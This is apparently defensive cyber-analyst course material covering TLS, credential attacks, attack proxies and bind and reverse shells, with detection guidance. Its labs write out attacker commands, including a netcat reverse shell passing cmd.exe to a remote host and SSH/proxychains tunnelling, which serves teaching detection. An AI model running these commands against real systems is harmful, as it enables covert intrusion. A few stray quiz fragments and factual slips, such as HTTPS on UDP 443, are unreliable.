Key exchange functions use asymmetric encryption. Diffie-Hellman (DH) key exchange is a popular method used to exchange keys and can technically be used for PKI, but is usually not, which is why DH does not provide for authentication. RSA is the dominant PKI algorithm in the market, which uses Certificate Authorities (CA) to verify the authenticity of entities on the internet, and can also be used for key exchange. DH and RSA are often used together to authenticate individuals and exchange keys.

﻿

The bulk encryption encrypts most of the communications, which may contain a lot of data. It needs to be fast, which asymmetric encryption is not. Symmetric ciphers are often thousands of times faster than asymmetric algorithms. This is why asymmetric encryption is used to share a symmetric cipher key or a session key. The session key is used with a symmetric encryption algorithm to encrypt the session.

﻿

The MAC ensures that the message was not changed between the sender and receiver. This is where hashes come in; the session key is combined with the data, and then the hash is calculated and transmitted along with the ciphertext. This ensures that only the sender or receiver could have been communicants of the session, as the session key is needed to generate the correct hash. The process described here is actually a hash-based message authentication code or HMAC. There are other methods of generating MACs that are not covered in this lesson.

﻿

These components — asymmetric encryption, symmetric encryption, and hashing — all work together to provide secure communications over the network.

﻿

Transport Layer Security (TLS) is a protocol that secures traffic from prying eyes and handles the implementation of the different types of cryptography. TLS is the successor to Secure Socket Layer (SSL). While originally developed with web browsing in mind, TLS can be used for much more than for HTTP security; it can secure many other protocols as well.

﻿

In the following lab, the transport protocols that secure communications over the network and their underlying cipher-suites using Zeek SSL logs are examined.

﻿In the ssl.cipher field, notice which cipher suite is used.


Breaking out the cipher suite from the first few results:
The key exchange algorithm is Elliptic Curve Diffie Hellman Exchange (ECDH) and RSA.




Figure 7.5-24
The bulk encryption mechanism is AES using a 256-bit key and CBC mode.




Figure 7.5-25
Message integrity is verified using SHA2-384.




Figure 7.5-26


Cipher suites are implemented via SSL/TLS. Notice that the SSL version used for the host ch-smtp.vcch.gov is TLS version 1.2.


A brief history on SSL and the naming convention to prevent future confusion as they are often used interchangeably: Netscape developed the SSL protocol and released the first version in 1995 as SSL version 2 (SSLv2); SSLv1 was never released. In 1996, Netscape released the next version, SSLv3, and turned it over to the Internet Engineering Task Force (IETF). The IETF made minor modifications and released it in 1999 as TLSv1.0. The most recent release is TLSv1.3. In chronological order, the versions of SSL/TLS are as follow:
SSLv2
SSLv3
TLSv1.0
TLSv1.1
TLSv1.2
TLSv1.3

All versions before TLS 1.2 were deprecated due to security vulnerabilities, as specified in the Request For Comments (RFC) 6176, RFC 7568, and RFC 8996. For example, SSLv3 and some implementations of TLS were found to be vulnerable to the Padding Oracle On Downgraded Legacy Encryption (POODLE) attack. The vulnerabilities exist in SSL/TLS, not the underlying cipher suite. To adhere to best security practices, disable TLS versions 1.1 and older on all clients in a network as well as servers hosting webpages.

Credential stuffing and password cracking overview
Detecting credential stuffing and password cracking
Preventing credential stuffing and password crackin

Credential Stuffing and Password Cracking Overview
This section explains what credential stuffing and password cracking are and how they work via two labs designed to demonstrate an attacker performing these activities. It is important for Cyber Protection Team (CPT) analysts to understand these techniques so they can detect and prevent them.

﻿

Credential Stuffing
﻿

﻿

﻿

MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) lists credential stuffing (T1110.004) as a sub-technique of brute force (T1110). Credential stuffing is the act of trying to authenticate to a service using a list of known usernames and passwords often obtained from a breach dump for a different service. This activity is automated using custom scripts or third-party tools. A credential stuffing attack is successful due to password reuse. Passwords are often reused across services because it is difficult to remember them for all the services they use.

﻿

The majority of credential stuffing tools are similar. They use different techniques for executing the attack, but essentially take a list of usernames and passwords, use them against a service, and alert the adversary if they worked.

﻿

This lesson does not get into the details of what credential stuffing tools exist or how to use them because this knowledge is not required for a CPT analyst to be successful at detecting and preventing this attack.

﻿

Password Cracking
﻿

﻿

﻿

There are several password cracking techniques used by adversaries. These are often done on the adversary's local machine, a specially designed cracking machine, or a cluster of machines working together. 

Brute-force: A brute force attack occurs when the character set and string length are chosen. The tool hashes every combination of those characters and compares them to the hash it is attempting to crack in an attempt to find a match.

Dictionary attack: A dictionary attack uses a list of strings that are most likely to be a match. The tool hashes all these strings and compares them to the hash it is trying to crack in an attempt to find a match.
Hybrid dictionary and rule-based dictionary attacks are variations of the dictionary attack and are not covered in this lesson.

Rainbow tables: Rainbow tables are pre-computed tables of hashes and their associated un-hashed strings. Using a rainbow table replaces the need for a large amount of memory with a need for a large amount of storage because the tables are very large. Salting passwords makes it near-impossible to use rainbow tables because the same passwords never have the same hash.

Detecting Credential Stuffing and Password Cracking
Detecting Credential Stuffing
﻿

Credential stuffing can be detected by several Windows event Identifiers (ID), depending on the service being attacked. Credential stuffing attacks directed at Windows services are going to produce a spike in the event ID 4624 "An account was successfully logged on."

﻿

Once it is determined that a credential stuffing attack occurred, event ID 4625 "An account failed to log on" is searched near the timeframe of the attack to determine if the adversary was unsuccessful in authenticating.

﻿

Below are additional event IDs that can be used to further investigate credential stuffing attacks on other services. These can be used in unison with 4624 and 4625.

Remote Desktop Protocol (RDP)
4624 and 4625
RDP uses logon types of 3 "Network" and 10 "RemoteInteractive/Terminal services."
Sysmon 3 "Network traffic"
Excessive connections to port 3389.
Server Message Block (SMB)
3 "Network traffic"
Excessive connections to port 445.
5140 "Network share object was accessed"
This ID can help determine what object the adversary accessed.
5168 "Service Principal Name (SPN) check for SMB/SMB2 failed"
This ID can be a sign of a malicious authentication attempt.
Windows Remote Management (WinRM)
3 "Network connection"
Excessive connections to port 5985.
80 "Processing request" and 143 "Response processing"
These IDs indicate the resource requested and whether the operation was successful or not.
166 "User authentication"
This ID indicates which authentication method was used.
Detecting Password Cracking
﻿

Password cracking happens on the adversary's machine. Custom-built machines are used that utilize powerful graphics cards to speed up the process. Instead of focusing on detecting password cracking, a better angle is to focus on detecting hash dumping and the exfiltration of hashes to the adversary machine.

Attack Proxy Use Case
A proxy is a system that serves as an intermediary device between a source and destination. It also fully translates all protocols and traffic from the source to the destination as if the proxy was itself the source. This translation occurs verbatim or with a change in destination ports.

﻿

In normal network communications, a targeted mission partner observes all reconnaissance and attacks as coming directly from an attacker.

However, in the use case where an adversary values obfuscation, when a proxy is employed, the targeted mission partner observes that traffic as coming directly from an entirely different device.

Why Are Attack Proxies Used?
﻿
A threat adversary uses attack proxies to prevent a mission partner’s defenders from identifying the true source of the attack. This attack origin defense is known as obfuscation. At times, this type of obfuscation is purposeful misdirection by choosing attack proxies in associated networks or geographical regions of other malicious actors.

The use of an external proxy for Command and Control (C2) by an attacker is described in the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework sub-technique T1090.002, which is especially valuable in obfuscating the source of critical C2 servers. 

﻿

"Sub-technique T1090.002: External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server."

These technologies are often employed by sophisticated actors and are often expensive to construct and maintain, so preserving the secrecy of their communications is a priority.

Limitations 

While valuable, obtaining and employing attack proxies is not without challenges. Attack proxies require significant resources to acquire and make reliable. They may also add complexity and additional operational time when attacking and accessing targets networks. Each of these limitations is explained below.
﻿
Resources

The use of a proxy requires an investment of time to identify and compromise appropriate targets for use as proxies, or money, and to purchase Virtual Private Servers (VPS) or Virtual Private Network (VPN) access, each of which have their own trails to follow to enable identification of the attackers. Sophisticated threat actors purchase or compromise devices that are in geographic proximity or logically adjacent to target networks, while other less sophisticated or resourced attackers use any available system and freely burn those proxies to achieve their goals. 

Reliable Access
﻿
If an attacker prioritizes stealth, it is difficult for them to achieve reliable access to compromised devices inside of the target network's trusted edge. External communications going into internal networks are often closely monitored and restricted, meaning that Bind shells are normally not a viable option. In that case, threat actors use connections that originate from within the target network, known as reverse connections, that can often circumvent perimeter defenses because traffic egressing from inside to outside a network boundary is not as carefully inspected or regulated. When using reverse connections, threat actors use protocols or protocol/port combinations that are likely to be allowed to traverse out, such as Hypertext Transfer Protocol Secure (HTTPS), Domain Name System (DNS), Internet Control Message Protocol (ICMP), or Simple Message Transfer Protocol (SMTP). Because initial attack connections can be more susceptible to discovery, threat actors often use separate attack proxies for initial compromise and sustained access operations such as C2.

Properly Configured Firewalls
﻿
If a defensive mechanism on a network's edge, such as a firewall, is properly implemented and configured, then defenders already have an advantage. Attribution of the source of an attack is secondary to stopping an attack. A properly configured firewall can make it difficult to communicate in to or out of a network. Attack proxies can help attackers shape the traffic to circumvent any rules that are blocking traffic but the difficulty of determining what traffic is allowed through increases the greater the defensive posture of the target network.
﻿
Increased Time of Execution

Proxies are another stop along the path of network traffic. This makes any actions executed by the proxy take significantly more time than if natively run and sent from the source. This is in addition to the processing time that applications on both the original source of malicious traffic and the proxy take to package the traffic.

Methods Overview


Threat adversaries employ a number of different techniques to ferry traffic from an origin through an external proxy to the mission partner's infrastructure. These include the use of tunnels created by applications such as SSH or Netcat, proxies created by C2 infrastructure, Multi-Hop Proxies such as TOR, host firewall rules, and cloud services.


As the actual techniques employed to set up the reliable connections required to proxy traffic are identical to the techniques discussed in a later lesson on pivoting, this lesson discusses these ideas at a high level and focuses on how the externally proxied traffic appears to the mission partner.


Application Tunnels


Each of the following applications forwards traffic from a local destination port on the proxy to a remote destination port on a target. Some are able to proxy a variety of traffic with a single connection, others are limited to single ports and single destinations before requiring reconstruction for new services and targets.


Applications that proxy multiple types of services or targets at once tend to employ the Socket Secure (SOCKS) protocol, which is a session-layer Internet Protocol (IP) that facilitates the proxy of any network communication on the part of a client device. Recall from CDA-Basic that SOCKS proxies support both Transmission Control Protocol (TCP) and User Datagram Protocol (UDP), as well as newer versions with the ability to require authentication, such as SOCKS5.


Secure Shell


Adversaries who have authenticated access to the intermediary proxy device and have Secure Shell (SSH) running on the device as a service create a dynamic SSH port forwarding service, which tunnels all traffic sent through it by means of a SOCKS proxy. If credentials are available on the proxy server, this is one of the most powerful and versatile options available. This leaves SSH logs on the proxy device, which, if not cleaned by the adversary, become another piece of evidence leading to potential attribution.


Socat and Netcat


These programs are often known as the Swiss Army knives of network service interaction and traffic redirection. They are highly versatile in sending and receiving a variety of data streams but are limited to one destination port and address at a time. This is very useful in proxying an attack that targets only one network service. Using these applications when proxying attacks becomes increasingly complicated (though not impossible) when dealing with multiple services, different callback ports, and dynamic high ports. These applications are powerful tools when predicting which port traffic returns to, and can meticulously create all the necessary tunnels, as the evidence of their operation exists solely in memory.


Other Applications


Additionally, custom scripts and applications continue to be developed with similar functionality. One example is the open-source project Chisel, which allows for single port forwarding similar to Socat, but creates a more dynamic SOCKS5 proxy when Chisel is running on both the attacker (client) device and proxy (server) device. 


C2 Infrastructure


Most C2 platforms include the ability to create and use SOCKS proxies for other C2 communications in their functionality. This essentially turns any device containing an active C2 implant, or client, into a potential redirector of attacker traffic. Many of these, such as PoshC2, Metasploit, Empire, and Cobalt Strike, enable the creation of SOCKS proxies on the implanted devices, which are equipped to receive and forward framework traffic. This traffic is often encrypted for maximum protection against detection until the last hop before the target, in which case having an authenticated SOCKS5 proxy is especially helpful. 


Multi-Hop Proxies
With sufficient time and resources available for an attack, threat adversaries gain greater obfuscation by chaining together multiple proxies in the communication flow of an attack. This is done manually by setting up multiple proxies in a series and configuring an application such as ProxyChains on the origin node. 


This is also commonly done through onion routing, which is a form of encrypted network communications. Onion routing prioritizes anonymity by restricting any node's understanding of the hops taken before or after it in a packet's travel. The most widely used and publicly available version of this is The Onion Router (TOR). This network has millions of users and thousands of network nodes and has been used for a great deal of MCA in the past due to its built-in anonymization. This serves the needs of an attacker desiring obfuscation without obtaining access to a proxy device. 


Due to its potential for proxying malicious traffic, all communications to and from TOR entry and exit nodes to public-facing mission partner systems need to be monitored, if not blocked outright.


Host Firewalls


Operating System (OS) host firewalls can be configured to redirect traffic directly from one external host to another. On Linux systems, this is usually conducted with the iptables or nftables utility, and on Windows systems, this is done with the netsh utility.


One drawback of this method is that, like the use of netcat, this form of redirection normally only proxies traffic to and from a specific port, rather than dynamically across all services. 


Cloud Infrastructure


Network services, data storage, desktops, and even MCA is increasingly moving to the cloud. A few providers only offer cloud hosting of files for websites and little else. Others offer much greater access such as allowing commands to be run on their devices, the opening of ports, and the starting of services. VPSs allow for complete control of the devices for a fee and essentially function as a client's own rented device.


Examples of cloud providers include Amazon Web Services (AWS), Microsoft Azure, Digital Ocean, and Linode. It is common in the Terms of Service (ToS) that these companies require clients to abide that no MCA be conducted from their services. Accordingly, contacting the service support of these companies to report abuse of their resources is a viable strategy, not only in stopping an on-going attack, but in gaining cooperation with a hunt or investigation. 


Attack Proxy Use


In order to practically explain how an attacker uses a proxy and identify through experience at least one of the limitations, use the provided attacker workstation to simulate a network scan with and without an attack proxy in place. After the simulation, observe  the differe nce in this traffic from the defender's perspective.


Workflow


1. Log in to the red-kali Virtual Machine (VM) using the following credentials:
Username: trainee
Password: CyberTraining1!



2. From a terminal window, execute a port scan against a device in the mission partner infrastructure. 


In order to save time, only the top 25 ports are scanned. In a live environment, threat actors conduct more extensive reconnaissance to determine all possible points of entry.
(trainee@red-kali)- [~] $ nmap -Pn --top-ports 25 128.0.7.25






Figure 7.7-3


The output of this device shows that it is running an SMTP server.





Figure 7.7-4


3. Create a dynamic SSH tunnel between the attacker machine and a peer device that has been co-opted for use in this reconnaissance campaign.
(trainee@red-kali)- [~] $ ssh -D 0.0.0.0:9050 -N -f trainee@128.0.7.207



In this SSH command, the following options are used:
-D. Creates a local dynamic port forwarding service to the remote device. The argument to this option indicates the local IP address to bind to and the local port to bind to. In this command, the address 0.0.0.0 indicates all addresses on all interfaces.
-N. Tells the process not to execute a remote command upon connecting. This is useful for only forwarding ports.
-f. Indicates that the SSH process that created the dynamic port needs to go to the background, which removes user interaction.

The Linux manual page describes how the tunnel is created:


"This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh acts as a SOCKS server."


This tunnel is created to form a proxy SOCKS4 through which traffic from another application, in this case Nmap, is transmitted. An examination of the configuration file proxychains reveals that it sends traffic through the localhost port 9050, which was created by the command.


4. Execute the same scan again, but this time, direct all traffic through the proxy SOCKS4 created by the SSH tunnel.
(trainee@red-kali)- [~] $ proxychains nmap -Pn --top-ports 25 128.0.7.25



This command sends the network traffic created by the Nmap scan through the local port 9050 to the proxy SOCKS4 to the destination at 128.0.7.25, while appearing to originate from the proxy itself at 128.0.7.207. 

The process takes about 5 minutes to fully execute. For attacks in which the timing of the arriving traffic is important, especially in the case of an exploit involving a race condition, this time delay is inexcusable on the part of the attacker.


In such a case, attackers choose an alternative course of action to circumvent this problem. One option is to obtain a single-use attacking device that is not proxied, with the understanding that the activity is collected and logged. Anothe r option is  to script and schedule an attack that executes from a node further forward in the communication stream. This option is non-interactive but mitigates any time delay problems created by proxy use. 

Several timeout errors are initially displayed, but the scan executes. A few timeout errors are returned after the scan has completed.

The same output returns, but the traffic flow is different when the second command is executed, which is seen in an examination of a capture of the network traffic which follows.

Reviewing Network Logs
Since two network scans were issued from the attacker's workstation, a network capture to observe the differences between the two from the perspective of a defender's network sensor can be examined. Reviewing captures such as these is a routine task when conducting hunt or response actions to known threat activity. 

﻿

Use Arkime to examine the traffic produced by the normal and proxied scans conducted. In this inspection, recognize that the identity of the attacking workstation is obfuscated during the second scan.

3. Set Time Range to a range that encompasses the network scans previously completed.

4. Set the following filter to find the network traffic of the scans recently completed:

ip.dst == 172.35.3.3 && ip.src == 128.0.7.205
﻿

This filter finds the sessions from the attacking workstation that are communicating with the mission partner's SMTP server.

﻿

The sessions view of Arkime only shows traffic from full TCP-connected sessions. Only the packets sent to open ports are visible, as the packets from all the filtered ports are dropped by the host.

﻿

The IP address of the SMTP server is 172.35.3.3. Due to network translation, the address which the attacker was able to see was 128.0.7.25, to which the Nmap scans were directed.


5. Replace the IP address of the attacking workstation with the IP address of the proxy to observe the second scan.

ip.dst == 172.35.3.3 && ip.src == 128.0.7.207
﻿
The output is otherwise similar, but the source address is that of the proxy, and there is no other indication in the traffic that the scan originated on the other device. If a threat actor is practicing appropriate tradecraft, the logs of this second scan are all that a defender works from. If an appropriately resourced attacker conducts reconnaissance from one proxy and exploitation from a different proxy, the task of coordinating defenses against an entity becomes extremely complicated.

﻿

As an analyst or defender, if the profile of potential threats includes such sophisticated actors, a far more effective strategy is to defend against the tradecraft itself, rather than identify the source of the threat.
﻿
The Attribution Problem
Challenge of Attribution
﻿
Truly identifying the source of MCA is not guaranteed. Since no physical act occurred (although physically enabling attacks through access to network cables, Universal Serial Bus [USB] drives, workstations, etc. are possible), and the means to digitally cover one's tracks exist and are employed by the best attackers, this identification is extraordinarily hard and is known in cybersecurity circles as the attribution problem.

﻿

Proxies forward all network traffic as if it were their own, so it is impossible from the mission partner (receiving) side to conclusively identify the source. However, even when the identity cannot be confirmed, the use of Open-Source Intelligence (OSINT) tools identifies the source IP address as a VPN or TOR exit node, a VPS, a cloud-based server, or other infrastructure that was clearly used as a proxy by savvy actors. This piece of information gives insight into the sophistication of the threat actor and leads to possible points of contact in an investigation.

﻿

When cooperation with owners of the proxy system is possible, obtaining the logs of the compromised or co-opted system aids in an investigation. For example, if a threat actor purchased resources on a cloud server to conduct actions, obtaining the provider's cooperation in dumping command history, connection logs, file hashes, and other artifacts aids in forming consensus or deterring future actions, but still rarely results in a legally-sound conclusion. To impede potential legal cooperation with a cybersecurity investigation, sophisticated actors use multi-hop proxies in which the individual hops exist in differing jurisdictions — such as different countries — to prevent the sort of cooperation that leads to completing the entire picture of how an attack progressed. 

﻿

On occasion, these artifacts are left behind on the proxy or even compromised mission partner systems intentionally. This could be a form of misdirection on the part of a savvy actor, in which they employ the known operating tools and tradecraft of a different Advanced Persistent Threat (APT) to pass attribution toward that threat.

Mitigation
Because the identity of a malicious attacker is rarely concretely confirmed, the strongest mitigation to the use of attack proxies is not to find the attacker, but to defeat the methodology employed, regardless of its source.

﻿

Pyramid of Pain
﻿

This idea is encapsulated well in David Bianco's Pyramid of Pain.

﻿

﻿

﻿

Figure 7.7-11

﻿

The Pyramid of Pain is an excellent way of representing the defense problem that a proxy represents and the value of targeting attacker tools and techniques, rather than simply addresses, domains, or hashes (though these cannot be ignored when the intelligence is available).

﻿

The problem of blocking a source of an attack and thinking that is an effective mitigation is that the single network node is a renewable resource for a sophisticated attacker. As David Bianco explains when describing his pyramid, "If you deny the adversary the use of one of their IP addresses, they can usually recover without even breaking stride." 

﻿

Firewalls
﻿

Since not every possible proxy is individually blacklisted, meaning that all traffic from that address is blocked, it is helpful to configure edge defenses to mitigate methodologies (such as gratuitous port scanning) rather than mitigate attacks from individual sources. This is accomplished with the classic cybersecurity paradigm of only allowing intended traffic.

﻿

Blacklisting can work in cases where potential proxies are publicly known in advance. This is the case with the multi-hop proxy technique mentioned earlier that employs the onion routing protocol. It is acceptable to deny traffic from known TOR entry and exit nodes to prevent an adversary's use of the TOR network to anonymize an attack on mission partner infrastructure.

Which statements about proxy limitations are true?
time or money to gain access
configure reverse shells to call back to the proxy address in order to mantain obfuscations

In order to save time, only the top 25 ports are scanned. In a live environment, threat actors conduct more extensive reconnaissance to determine all possible points of entry.
(trainee@red-kali)- [~] $ nmap -Pn --top-ports 25 128.0.7.25

Which statement is true of attribution in malicious cyberspace activity?
 The origin of an attack cannot be conclusively determined.

Introduction
﻿

﻿

This lesson covers the use of interactive shells to include bind and reverse shells. Bind and reverse shells are used by the adversary to conduct remote activities, such as stealing data, once access to a machine has been achieved. This lesson covers how to identify the characteristics and components of each shell, as well as how to discover suspicious activity related to their use in event logs. Through these guided scenarios, an understanding of how the shells are initiated, how adversaries may attempt to disguise their use, and how to identify and investigate shell activity using a Security Information Event Manager (SIEM) is gained. As a final exercise, a scenario is presented with guided questions on how to execute an investigation.

﻿
Shell overview

Bind shells

Reverse shells

Non-standard listening or connected services or ports

Common shell activity in event logs

Shell Overview
﻿

Figure 8.1-1

﻿

When an attacker obtains Remote Command Execution (RCE) on a target server, it may be the "beginning-of-the-end" of an engagement, but the attacker could still be far from achieving their objectives.

﻿

Due to the nature of initial exploitation and code execution typically providing limited capabilities, an attacker is often required to convert their RCE to a stable interface with the attacked system as quickly as possible. This interface should include the following characteristics:

Be unhindered by network devices between an attacker and their target.

Offer stable, repeatable command execution on the affected system.

Return the output of the commands run by the attacker.

The simplest solution that offers all three characteristics is a stable command console from which the compromised device reaches out to the attacker. This solution is often referred to as a shell. A shell is an interface that allows a host to be accessed remotely. 

﻿

Generally, an exploit is the riskiest and noisiest part of any hacking operation. This is because it almost always and almost immediately results in the attacked system responding with some kind of behavior that was not intended by the network architects. Byproducts of exploiting a remote system could include:

Unforeseen logging.

File system modifications.

Application or system crashes.

Any of these byproducts listed could incriminate the attacker's activities in or against a target network.

﻿

Listening Shell
﻿

Consider a simple concept: the listening shell. This occurs when an exploit payload opens a port on the compromised device and directs input from connections on that socket to the system's native shell (usually /bin/sh or cmd.exe) through a system() or exec() call. There are some barriers to listening shells:

Listening shells are often an easier, basic tool for attackers, but are often inaccessible due to network security devices blocking incoming requests.

If a listening shell is started by an attacker and they cannot access it, it may remain listening indefinitely, which means the attacker needs another machine to create another listener.

Listening on ports that would be allowed by a firewall, etc., often require elevated privileges, which the initial exploit shell often does not have.

The original Netcat can be used to simulate this concept. The original build of Netcat featured a -e command argument, which would take the input from the socket and forward its stdin/stdout/stderr from the socket opened by Netcat to the executable specified in the option's argument and vice versa. Netcat and the -e argument are used in this lesson to establish a reverse shell. 

﻿

A shortcoming of configuring an exploit payload to force a target device to listen is that starting a listening shell is effective only if the targeted device accepts inbound traffic from the attacker device on arbitrary ports. This is rarely the case if there is a firewall or network address translation between the target and the attacker.

Bind Shells
The most basic type of shell attackers often use to deliver a payload is a bind shell. Once initiated, the bind shell waits for communication from the attacker machine in order to execute specific commands. The communication port is often referred to as a listener. A key distinction with the bind shell framework is that the listener waits for an incoming connection, once a connection is made the attacker can connect to the listener and deliver the payload. The payload can be anything, such as malicious code or documents. 

﻿

In Figure 8.1-2, the attacker machine connects to a listening port located on the target machine. 


Bind Shell Key Components 
﻿

The following are key components of bind shells:

The attacker's host initiates the TCP 3-way handshake (or connection).

The shell is initiated by the victim host.

The target machine needs to have listening ports open and accessible so that the communications can reach the attacker machine.

A Network Address Translation (NAT) enabled machine prevents remote accessibility for the attacker machine. NAT is a networking component designed to conserve Internet Protocol (IP) addresses and allow machines to securely access the internet. 



The open listener defines that anyone who connects to the ch-tech-2 VM via Transmission Control Protocol (TCP) port 4444 presents with a Command-Line Interface (CLI).


8. In a new PowerShell window, execute the following command:
PS C:\Users\trey.pitts> netstat -ano


Using Netcat, a bind shell session has been created on ch-tech-2 and connected to from the ch-tech-1 VM. The user of the ch-tech-1 VM now has CLI access to the user trey.pitts. It is through this method that an attacker, once access has been gained to a system, can open a listener, access CLI remotely, and retrieve data. It is important to remember that no firewalls or NAT are present, making the bind shell possible.


10. Return to the ch-tech-2 VM. In the PowerShell window that is not running Netcat, execute the following command to recheck the network connections:
PS C:\Users\trey.pitts> netstat -ano

Reverse Shells
A reverse shell is similar to a bind shell; however, the TCP connection is initiated from the victim host to the attacker host. Once an attacker has exploited and gained command execution, a reverse shell can be leveraged to deliver payload and further their campaign. Additionally, unlike the bind shell, a reverse shell still functions across a NAT boundary, making it the preferred choice. The reserve shell functions because firewalls performing NAT are typically more permissive of internal hosts connecting to outside hosts, this is permitted and generates a mapping in the NAT table. This does not work the other way (in a bind shell) unless there is a static NAT mapping from outside to inside.

﻿

﻿

Figure 8.1-8

﻿

In Figure 8.1-8, the victim machine initiates the TCP SYN connection requests a connection request. The attacker machine accepts the connection and sends commands. Once a connection is completed, the victim pipes the network connection to a command shell that allows the attacker to continue their activities and send additional payloads, if needed.

﻿

Reverse Shell Key Components 
﻿

The following are key components of reverse shells:

The target machine initiates the TCP connection to the attacker machine, connecting and communicating to the server. It is important to note that this is the opposite of the bind shell. 

The target machine must be directly accessible remotely from the attack machine.

The shell is initiated by the target host. 

A reverse shell functions regardless of a NAT in place, as long as not further limited by firewall rules or other network security devices. Attackers typically use common web ports as the destination for reverse shells so that firewall rules are more likely to permit the activity.

Methods of Establishing Reverse Shells
﻿

The following are a few methods of establishing a reverse shell on Windows:

PowerShell 

Python

Perl

Ruby

8. From the Cmd line, execute the following command:
Cmd line: -nv 172.35.13.2 4444 -e cmd.exe

This establishes a connection to ch-tech-1 (172.35.13.2):

9. Return to the ch-tech-1 VM. Figure 8.1-10 shows the Windows PowerShell session:

This command is similar to the bind shell, however, the -e flag passes the cmd.exe as a parameter to it allowing a reverse shell to establish. Notice we now have access to the CLI on ch-tech-2 as user trey.pitts. Using a reverse shell the connection is established from the target machine, avoiding detection and firewall rules. 

Non-Standard Listening or Connected Services or Ports
TCP and User Datagram Protocol (UDP) use port numbers to identify applications that hosts are utilizing and that communicate with each other. Communications are identified by their respective source and destination IP address and TCP/UDP port numbers. Port numbers can be any number between 1 and 65535; however, server applications are most commonly found below the value 1024. A few well-known ports are listed below:

TCP 20 and 21 (File Transfer Protocol, FTP)
TCP 22 (Secure Shell, SSH)
TCP 23 (Telnet)
TCP 25 (Simple Mail Transfer Protocol, SMTP)
TCP and UDP 53 (Domain Name System, DNS)
UDP 69 (Trivial File Transfer Protocol, TFTP)
TCP 80 (Hypertext Transfer Protocol, HTTP)
TCP 119 (Network News Protocol, NNTP)
TCP, UDP 139 (Windows File and Print Sharing)
UDP 161 and 162 (Simple Network Management Protocol, SNMP)
UDP 443 (Secure Sockets Layer over HTTP, HTTPS)
TCP 445 (Server Message Block, SMB)
TCP 3389 (Remote Desktop Protocol, RDP)
TCP 8080 (Alternative port for HTTP traffic or for a proxy server)
It is important to remember that no list is exhaustive and they should remember the ports discussed in CDA-B. 


In an attempt to avoid detection and bypass filtering, attackers may use non-standard listening or connected services or ports. Often attackers use ports that are not commonly related or associated with one another to disturb analysis and the parsing of network data, thus avoiding detection. A standard port for Hypertext Transfer Protocol Secure (HTTPS) is port 443. According to MITRE, an attacker may use ports 8088 or 587 as an alternate non-standard port for a shell.

Detection
﻿
Detection for non-standard listening or connected services or ports is a straightforward strategy, packets that do not follow typical or expected behavior should be analyzed. Detection engineering is a critical component to discover threat activity. Detection rules that are tripped when non-standard services or ports are used need to be developed, alerting analysts the moment the services or ports are used. Mismatched or unexpected protocols and ports, such as non-encrypted HTTP traffic on port 443, can be automatically identified using a tool such as Security Onion or Zeek.

﻿

Security Onion and Zeek identify the protocol type and do not only rely on the port to determine the type of traffic. Additionally, analysis of the network for data flows where a host sends significantly more data than it receives is a key indicator of potential threat activity. A host sending large amounts of data can be indicative of threat presence on a machine. This is especially the case if the host is utilizing network communications where it is not expected. 

Common Shell Activity in Event Logs
Windows event logs are useful to track a user or application's usage and processes. Analysis of event logs aids in the identification and detection of shell activity by identifying connections made by processes on hosts. All hosts on the network need to be configured to audit the success and failure of certain key events through the use of Group Policy Objects (GPO). Below are key events that need to be audited.

﻿

Process Creation
﻿
Within the Local Group Policy Editor window, the following path leads to the Audit Process Creation configuration: Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Detailed Tracking > Audit Process Creation. Audit Process Creation, according to Microsoft, determines whether the Operating System (OS) generates audit events when a process is created (starts). The audit events can help track user activity and understand how a computer is being used. Information includes the name of the program or the user that created the process. With regard to interactive shells, Audit Process Creation identifies if cmd.exe was created and/or accessed. The Windows event ID associated with process creation is ID 4688. 

﻿

Platform Connection 
﻿
Within the Local Group Policy Editor window, the following path leads to the Audit Process Creation configuration: Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Object Access > Audit Filtering Platform Connection. Audit Platform Connection, according to Microsoft, determines whether the OS generates audit events when connections are allowed or blocked by the Windows Filtering Platform (WFP). WFP enables Independent Software Vendors (ISV) to filter and modify TCP/IP packets, monitor or authorize connections, filter Internet Protocol Security (IPSec)-protected traffic, and filter Remote Procedure Calls (RPC). This subcategory contains WFP events about blocked and allowed connections, blocked and allowed port bindings, blocked and allowed port listening actions, and blocked to accept incoming connections applications. The Windows event IDs associated with platform connection are ID 5156 (WFP has allowed a connection), 5157 (WFP has blocked a connection), and 5158 (WFP has permitted a bind to a local port).

﻿5. Select the three-line menu on the left, within the menu, under Analytics, select Visualize Library.


6. Within Visualize Library, select Create Visualization.


7. Within New visualization, select Aggregation Based > Data Table.


8. Within New Data table/Choose a source, select *:so-*. The table looks like Figure 8.1-13:

NOTE: The count is different from the screenshot due to Kibana's defaulting to a timeframe of Last 24 hours. 


9. Set the time and date range to: Nov 1, 2021 @ 00:00:00.000 -> Nov 8, 2021 @ 23:30:00.000.


10. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: agent.hostname.keyword
Metric: Count
Order: Descending 
Size: 100

This bucket adds the hostnames of host reporting to Elastic Stack to the data table.


11. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: destination.port
Metric: Count
Order: Descending 
Size: 100

This bucket adds the destination ports of all communications from the hosts reporting to Elastic Stack to the data table.


12. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: destination.ip
Metric: Count
Order: Descending 
Size: 100

This bucket adds the destination IP addresses of all communications from the hosts reporting to Elastic Stack to the data table.

This can help visualize the logs that contain vital communication information. During a hunt or investigation, this can be used to quickly analyze destination IP addresses and ports to identify potentially suspicious activity. IP addresses and ports that populate with significantly less frequency should be reviewed immediately to determine if the activity is expected.  


The type of process used by hosts can help to identify suspicious activity. An unexpected or mysterious process can be quickly identified by the communications collected by the SIEM.


13. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: process.name.keyword
Metric: Count
Order: Descending 
Size: 100

